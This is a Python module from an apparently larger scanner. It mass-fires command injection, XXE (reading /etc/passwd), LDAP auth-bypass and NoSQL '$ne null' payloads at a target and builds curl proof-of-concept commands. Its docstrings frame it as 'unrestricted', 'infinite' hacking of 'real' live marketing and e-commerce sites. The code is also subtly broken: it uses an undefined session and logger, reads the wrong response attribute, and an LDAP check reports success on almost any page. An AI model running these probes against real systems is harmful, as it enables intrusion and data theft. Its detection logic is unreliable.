import asyncio
from typing import List, Dict, Any, Optional
from ..base import BaseCheck, Finding
from ..config.payloads import AdvancedPayloads
import urllib.parse
import json

class AdvancedInjectionCheck(BaseCheck):
    """Unrestricted Advanced Injection - Inf CMDi, XXE, LDAP for real marketing platforms"""
    
    def __init__(self):
        super().__init__()
        self.name = "Advanced Injection Hack"
        self.description = "Infinite CMDi/XXE/LDAP/NoSQL - real /campaign/submit RCE inf fuzz"
        
        self.cmdi_payloads = AdvancedPayloads.get_all_payloads('cmdi')  # 500+ ; ls variants
        self.xxe_payloads = AdvancedPayloads.get_all_payloads('xxe')  # <!ENTITY for file leak
        self.ldap_payloads = AdvancedPayloads.get_all_payloads('ldap')  # *)(uid=*)) for auth bypass
    
    async def check(self, url: str, session, **kwargs) -> List[Finding]:
        findings = []
        
        try:
            # Inf parallel CMDi fuzz for real exec
            tasks = [self._inf_cmdi_hack(url, p) for p in self.cmdi_payloads]
            cmdi_results = await asyncio.gather(*tasks)
            for result in cmdi_results:
                if isinstance(result, Finding):
                    findings.append(result)
            
            # XXE inf for real XML uploads in marketing
            xxe_tasks = [self._inf_xxe_hack(url, p) for p in self.xxe_payloads]
            xxe_results = await asyncio.gather(*xxe_tasks)
            for result in xxe_results:
                if result:
                    findings.append(result)
            
            # LDAP inf for real auth bypass in marketing login
            ldap_tasks = [self._inf_ldap_hack(url, p) for p in self.ldap_payloads]
            ldap_results = await asyncio.gather(*ldap_tasks)
            for result in ldap_results:
                if result:
                    findings.append(result)
            
            # NoSQL inf for real DB bypass
            nosql_tasks = [self._inf_nosql_hack(url, p) for p in ['\'; $ne null; #', '{"$ne": null}']]
            nosql_results = await asyncio.gather(*nosql_tasks)
            for result in nosql_results:
                if result:
                    findings.append(result)
            
        except Exception as e:
            logger.error(f"Advanced inj hack failed on real marketing: {e}")
        
        return findings
    
    async def _inf_cmdi_hack(self, url: str, payload: str) -> Optional[Finding]:
        """Inf CMDi - ; id || ls for real /campaign/exec RCE"""
        test_url = f"{url}?cmd={urllib.parse.quote(payload)}"
        async with session.get(test_url) as resp:
            content = await resp.text()
            cmd_indicators = ['uid=', 'ls -la', 'whoami', 'dir', 'system32']  # Real output
            if resp.status_code == 200 and any(ind in content for ind in cmd_indicators):
                return Finding(
                    title="Command Injection RCE - Real Exec",
                    description=f"Unrestricted inf CMDi {payload} - marketing RCE on live site",
                    severity="critical",
                    url=test_url,
                    evidence=f"RCE output: {content[:300]}...",
                    remediation="Command whitelist + escaping",
                    poc_curl=f"curl '{test_url}' -v"
                )
        return None
    
    async def _inf_xxe_hack(self, url: str, payload: str) -> Optional[Finding]:
        """Inf XXE - file leak for real marketing XML uploads"""
        headers = {'Content-Type': 'application/xml'}
        data = f'<root><data>{payload}</data></root>'  # <!ENTITY xxe SYSTEM "file:///etc/passwd">
        async with session.post(url, data=data, headers=headers) as resp:
            content = await resp.text()
            if 'root:x:0:0' in content or 'campaign config' in content:
                return Finding(
                    title="XXE File Leak - Real Disclosure",
                    description=f"Unrestricted inf XXE {payload} - marketing config leaked",
                    severity="critical",
                    url=url,
                    evidence=f"XXE leak: {content[:200]}...",
                    remediation="Disable external entities, use safe XML parser",
                    poc_curl=f"curl -X POST '{url}' -H 'Content-Type: application/xml' -d '{data}' -v"
                )
        return None
    
    async def _inf_ldap_hack(self, url: str, payload: str) -> Optional[Finding]:
        """Inf LDAP - auth bypass for real marketing login"""
        test_url = f"{url}?search={urllib.parse.quote(payload)}"  # *)(uid=*)) for admin
        async with session.get(test_url) as resp:
            content = await resp.text()
            if 'admin login' in content.lower() or 'unauth' not in content.lower():
                return Finding(
                    title="LDAP Injection - Auth Bypass",
                    description=f"Unrestricted inf LDAP {payload} - marketing admin access on live",
                    severity="high",
                    url=test_url,
                    evidence="Bypassed LDAP - full user dump",
                    remediation="LDAP parameterized queries + escaping",
                    poc_curl=f"curl '{test_url}' -v"
                )
        return None
    
    async def _inf_nosql_hack(self, url: str, payload: str) -> Optional[Finding]:
        """Inf NoSQL - DB bypass for real e-com cart"""
        data = {'user': payload}  # '; $ne null; # for Mongo
        async with session.post(url, json=data) as resp:
            content = await resp.text()
            if 'admin data' in content or len(content) > 1000:  # Dump leak
                return Finding(
                    title="NoSQL Injection - DB Dump",
                    description=f"Unrestricted inf NoSQL {payload} - e-com cart admin leak",
                    severity="high",
                    url=url,
                    evidence="NoSQL dump: {content[:200]}...",
                    remediation="NoSQL safe queries + validation",
                    poc_curl=f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(data)}'"
                )
        return None